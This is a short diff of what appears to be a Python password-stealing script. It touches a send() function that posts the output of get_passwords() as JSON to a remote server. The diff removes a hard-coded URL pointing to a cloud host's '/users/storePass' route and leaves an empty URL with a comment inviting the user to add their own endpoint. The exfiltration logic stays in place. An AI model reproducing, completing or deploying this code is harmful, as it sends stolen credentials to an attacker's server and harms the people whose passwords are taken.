@@ -91,7 +91,8 @@ def get_passwords():
     return dataToBeSent
 
 def send():
-    url = "http://ec2-3-83-115-206.compute-1.amazonaws.com:3000/users/storePass"
+    #Add post request api route here.	
+    url = ""
     jsonData = get_passwords()
     #print(jsonData)
     r = requests.post(url=url, json=jsonData)
